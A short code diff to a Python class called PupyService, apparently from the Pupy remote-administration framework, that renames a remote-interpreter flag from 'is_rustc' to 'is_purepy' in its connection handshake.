@@ -75,7 +75,7 @@ class PupyService(Service):
 
         self.protocol_version = None
         self.remote_version = (2, 7)
-        self.remote_is_rustc = False
+        self.remote_is_purepy = False
 
         self.events_receiver = None
 
@@ -150,7 +150,7 @@ class PupyService(Service):
         register_cleanup, unregister_cleanup,
         remote_exit, remote_eval, remote_execute,
         infos, loaded_modules, cached_modules,
-            pupyimporter, pupyimporter_funcs, is_rustc, *args):
+            pupyimporter, pupyimporter_funcs, is_purepy, *args):
 
         if __debug__:
             logger.debug(
@@ -160,7 +160,7 @@ class PupyService(Service):
 
         self.protocol_version = protocol_version
         self.remote_version = remote_version
-        self.remote_is_rustc = is_rustc
+        self.remote_is_purepy = is_purepy
 
         if sys.version_info.major == 3 and \
                 self.remote_version[0] == 2:
